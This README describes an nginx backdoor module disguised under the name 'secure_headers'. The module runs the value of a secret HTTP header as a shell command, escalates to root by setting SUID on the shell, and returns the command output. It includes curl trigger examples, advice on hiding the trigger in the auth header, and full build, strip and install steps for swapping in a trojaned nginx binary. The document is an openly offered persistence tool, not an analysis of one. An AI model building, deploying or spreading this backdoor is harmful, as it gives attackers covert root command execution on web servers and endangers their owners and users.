# Info
Backdoor command execution as the nginx worker process (www-data)

This inserts itself as a handler during the `NGX_HTTP_ACCESS_PHASE` and looks for a specific header (`backdoor` in source)

When that header is found it executes the value of the header as a command and returns the output
```
curl -H "vgo0: whoami" localhost:8888
root
```

Using a header nginx already references would be more performant instead of having to seek the custom one.

https://github.com/nginx/nginx/blob/master/src/http/ngx_http_request.h

A good spot might be to stack this in the auth header

During module init there is a phase where commands can usually be run as root depending on how nginx is getting started

This can be used to provide escalation persistance (SUID, Privileges, etc)

See `ngx_http_secure_headers_init` for very basic example

A poor mans escalation within command exec is provided via chmod u+s of the shell specified. This then gets passed to popen. On normal nginx teardown this will be reverted (chmod u-s)

It is roughly:

`popen(escalate + " -p -c " + header_in + " 2>&1")`

`popen('/bin/sh -p -c whoami 2>&1')`

popen is ultimately sh -c so it becomes something like:

`/bin/sh -c '/bin/sh -p -c whoami 2>&1'`

There are likely stealthier methods available

Setting `escalate` to `""` avoids this

# Sample
A sample dynamic and static version are provided in the docker folders compiled against `1.21.6`
```
cd docker-dynamic
docker-compose up -d

curl -H "vgo: whoami" localhost:8888
Normal output

curl -H "vgo0: whoami" localhost:8888
root
```

# Usage

This is version specific

# Download
https://nginx.org/en/download.html

Extract

Switch to directory

# Dynamic
## Configure - Dynamic
`./configure --add-dynamic-module=/opt/nginx-backdoor --with-compat`

## Make - Dynamic
`make modules`

## Get .so
```
strip -s objs/ngx_http_secure_headers_module.so
cp objs/ngx_http_secure_headers_module.so ...
```

## Enable - Dynamic
Place .so on disk

Add to nginx config somehow (for dynamic):

load_module path/to/ngx_http_secure_headers_module.so;

service nginx restart

# Static
## Configure - Static
Basic that works can be tested in docker (paths etc should match if replacing):

`./configure --sbin-path=/usr/sbin/nginx --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --prefix=/usr/lib/nginx --add-module=/opt/nginx-backdoor`

## Make - Static
`make`

## Get resulting 
```
strip -s objs/nginx
cp objs/nginx
```
